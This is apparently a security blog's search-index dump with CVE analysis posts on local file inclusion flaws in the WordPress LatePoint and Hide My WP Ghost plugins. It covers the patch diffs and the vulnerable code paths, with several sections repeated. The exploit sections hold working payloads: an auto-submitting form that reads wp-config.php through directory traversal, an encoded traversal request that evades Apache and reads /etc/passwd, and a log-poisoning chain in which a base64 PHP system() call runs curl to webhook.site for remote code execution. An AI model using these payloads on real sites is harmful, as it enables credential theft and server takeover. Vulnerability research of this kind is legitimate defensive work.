2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } The patch adds get_safe_layout_path() to remove /, \\, ., and null bytes; only allow [A-Za-z0-9_-]; construct the path, use realpath() and compare it with LATEPOINT_VIEWS_LAYOUTS_ABSPATH. The file is included only if valid, preventing LFI. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code The render() function is called in 12 different locations, so manual tracing would be time-consuming. 12 call locations of render() To optimize, use a debugger: Set a breakpoint inside render(). Perform various actions through the UI. Each time render() is called, execution pauses at the breakpoint and highlights the corresponding code line, allowing quick identification of call flows. Debugger jumps to breakpoint 👉 When accessing the endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view with route names as plugin submenus, render() is invoked with the default layout admin. Default layout Examining the callstack reveals the call flow leading to render(). Callstack flow function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html = ''; if($this-\u003eget_return_format() == 'json'){ if(is_array($view_name)) $view_name = $view_name['json_view_name']; $response_html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), 'none', $extra_vars); $this-\u003esend_json(array_merge(array('status' =\u003e LATEPOINT_STATUS_SUCCESS, 'message' =\u003e $response_html), $json_return_vars)); }else{ if(is_array($view_name)) $view_name = $view_name['html_view_name']; $this-\u003eextra_css_classes[] = $this-\u003egenerate_css_class($view_name); $this-\u003evars['extra_css_classes'] = $this-\u003eextra_css_classes; $html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), $this-\u003eget_layout(), $extra_vars); } return $html; } render() is called by format_render_return() when get_return_format() is not json; by default, it’s html. $return_format = 'html' ... function get_return_format(){ return $this-\u003ereturn_format; } The layout we’re interested in comes from get_layout(). Since get_layout() exists, there should be a corresponding set_layout(). Searching for set_layout in the same file shows how the layout value is set. $layout = 'admin' ... function set_layout($layout = 'admin'){ if(isset($this-\u003eparams['layout'])){ $this-\u003elayout = $this-\u003eparams['layout']; }else{ $this-\u003elayout = $layout; } } The $layout variable is assigned the default value 'admin', matching the layout analyzed earlier. The set_layout() function determines which layout to use: If $this-\u003eparams contains a layout parameter, it uses that value. Otherwise, it falls back to the default ('admin'). We can use the debugger again to inspect $params. Value of $params $params includes two keys, page and route_name, matching the query parameters when accessing http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view. 👉 Therefore, layout can also be passed as a URL parameter — which we can exploit. Try accessing the endpoint with a layout parameter: GET /wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view\u0026layout=payload HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=latepoint Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175 $layout is now fully under our control. Controlled $layout ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a webpage containing a form that automatically submits an LFI payload. \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"latepoint\"\u003e \u003cinput type=\"text\" name=\"route_name\" value=\"calendars__view\"\u003e \u003cinput type=\"text\" name=\"layout\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2 Send the malicious webpage link to an admin or privileged user. Result: The debugger stopped at wp-config.php. Successful LFI result Info Since this CVE is Unauthenticated, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a webpage containing a form that automatically submits an LFI payload. \u003c!DOCTYPE html\u003e Document Step 2 Send the malicious webpage link to an admin or privileged user. Result: The debugger stopped at wp-config.php. Successful LFI result Info Since this CVE is Unauthenticated, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a webpage containing a form that automatically submits an LFI payload. \u003c!DOCTYPE html\u003e Document Step 2 Send the malicious webpage link to an admin or privileged user. Result: The debugger stopped at wp-config.php. Successful LFI result Info Since this CVE is Unauthenticated, it leverages a plugin endpoint without nonce checking. Logged-in users visiting the malicious page automatically send the request to the vulnerable WordPress site along with their cookies. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions ≤ 5.1.93 of LatePoint are vulnerable to LFI because the layout parameter is not validated before being passed to include(), leading to potential local file disclosure (e.g., wp-config.php). The issue was patched in 5.1.94 by sanitizing characters, using realpath(), and restricting to valid directories. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways This is LFI (file read) — no RCE observed in PoC. Path-controlled parameters must be sanitized + canonicalized before use. Use realpath() and base directory validation to prevent traversal. Never include directly from request data; use safe helpers like get_safe_layout_path(). ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress LatePoint Plugin \u003c= 5.1.93 is vulnerable to Local File Inclusion ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Hide My WP Ghost plugin version ≤ 5.4.01 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (for example configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, possible code execution. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) and 5.4.02 (patched). Diff tool - Meld or any diff/comparison tool to check and compare differences between the two versions. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } The getOriginalUrl() function is used to parse and reconstruct the original URL based on the system’s rewrite rules. In the vulnerable version, the value of $new_url is not sanitized before being returned, allowing an attacker to inject malicious path components like ../../etc/passwd, leading to LFI risk. Patched version: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return sanitize_url( $new_url ); } The patch calls sanitize_url($new_url) before returning, which helps remove dangerous path components or schemes, preventing LFI. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code getOriginalUrl() is called in showFile(), and its return value is assigned to $new_url public function showFile( $url ) { // other logic $new_url = $this-\u003egetOriginalUrl( $url ); $new_url_no_query = ( ( strpos( $new_url, '?' ) !== false ) ? substr( $new_url, 0, strpos( $new_url, '?' ) ) : $new_url ); $new_path = $this-\u003egetOriginalPath( $new_url ); $ctype = false; if ( $ext = $this-\u003eisFile( $new_url ) ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getOption( 'hmwp_login_url' ) . '/' ) || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_login_url' ) . '/' ) ) { // other logic } elseif ( $url \u003c\u003e $new_url ) { if ( stripos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-json' ) . '/' ) !== false ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) . '/' ) !== false || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-signup_url' ) . '/' ) !== false ) { ob_start(); include $new_path; $content = ob_get_clean(); header( \"HTTP/1.1 200 OK\" ); //Echo the html file content echo $content; exit(); } elseif ( ! HMWP_Classes_Tools::getValue( 'nordt' ) ) { // other logic } } } include $new_path is the point that can cause LFI; for it to be reached, the surrounding conditions must be satisfied. $url is different from $new_url In getOriginalUrl() the query handling is: if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } wp_parse_url( 'http://localhost/x/abc?' ) -\u003e has a path but query is empty (or query is unset / empty). The condition isset(...) \u0026\u0026 ! empty(...) will fail for a bare ? without parameters, so nothing is appended to $new_url. $new_url returns http://localhost/x/abc (no ?), while the original $url is http://localhost/x/abc?, so they differ and ($url \u003c\u003e $new_url) is true. $new_url_no_query must contain the string '/' . HMWP_Classes_Tools::getDefault('hmwp_activate_url') . '/'. Searching the plugin source for hmwp_activate_url, we find the function HMWP_Classes_Tools::getDefault('hmwp_activate_url') returns wp-activate.php. Return value of HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) Therefore, the practical condition is that $new_url_no_query must contain /wp-activate.php/. 👉 Thus, for include $new_path to be executed, the URL must have a trailing ? (so $url \u003c\u003e $new_url) and contain /wp-activate.php/ in the path. $new_path is the return value of getOriginalPath($new_url) public function getOriginalPath( $new_url ) { // Remove domain from path $new_path = str_replace( home_url(), '', $new_url ); // Remove queries from path if ( strpos( $new_path, '?' ) !== false ) { $new_path = substr( $new_path, 0, strpos( $new_path, '?' ) ); } return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, '/' ); } This function returns the root path without the query string, for example: \"http://localhost/x/wp-activate.php?\" -\u003e \"/srv/www/wordpress/x/wp-activate.php\" So we have the necessary conditions for LFI to occur; we need to find the call flow to showFile() public function maybeShowNotFound() { //If the file doesn't exist //show the file content if ( is_404() ) { $this-\u003eshowFile( $this-\u003egetCurrentURL() ); } else { $this-\u003emaybeShowLogin( $this-\u003egetCurrentURL() ); } } showFile() is called by maybeShowNotFound when the client requests a non-existent resource, with the parameter being the result of getCurrentURL(). public function getCurrentURL() { $url = ''; if ( isset( $_SERVER['HTTP_HOST'] ) ) { // build the URL in the address bar $url = is_ssl() ? 'https://' : 'http://'; $url .= $_SERVER['HTTP_HOST']; $url .= rawurldecode( $_SERVER['REQUEST_URI'] ); } return $url; } The URI from $_SERVER['REQUEST","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request with the LFI payload GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Debug: Debugger with valid payload Result: Successful LFI result Explanation: /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? after decoding becomes /x/wp-activate.php/..///..///..///..///../etc/passwd? We use this string to trick Apache so that Apache does not detect Document Root traversal. If we use /x/wp-activate.php/../../../../../etc/passwd? Apache will detect the Document Root traversal. /// is still accepted as equivalent to /, for example: w41bu1@22NS088:~$ ls ///////// bin boot cdrom dev etc home lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var swap.img ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning → LFI → RCE Step 1 Send a request with PHP code placed in the User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2 Send a request with the LFI payload pointing to /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Successful LFI =\u003e RCE result Explanation: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" When include() loads a file, PHP will execute any PHP code (\u003c?php ?\u003e) contained in the file before returning. The payload is Base64-encoded and decoded at include time with base64_decode to avoid escaping issues with quotes (\" → \\\") when the logger writes it. The decoded command becomes: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Finally, system() runs this command and returns its output. Warning Note: although base64_decode may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#log-poisoning--lfi--rce"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning → LFI → RCE Step 1 Send a request with PHP code placed in the User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2 Send a request with the LFI payload pointing to /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Successful LFI =\u003e RCE result Explanation: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" When include() loads a file, PHP will execute any PHP code (\u003c?php ?\u003e) contained in the file before returning. The payload is Base64-encoded and decoded at include time with base64_decode to avoid escaping issues with quotes (\" → \\\") when the logger writes it. The decoded command becomes: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Finally, system() runs this command and returns its output. Warning Note: although base64_decode may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning → LFI → RCE Step 1 Send a request with PHP code placed in the User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2 Send a request with the LFI payload pointing to /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: Successful LFI =\u003e RCE result Explanation: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e When visiting the site with a User‑Agent containing the payload above, Apache will log this payload into the access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" When include() loads a file, PHP 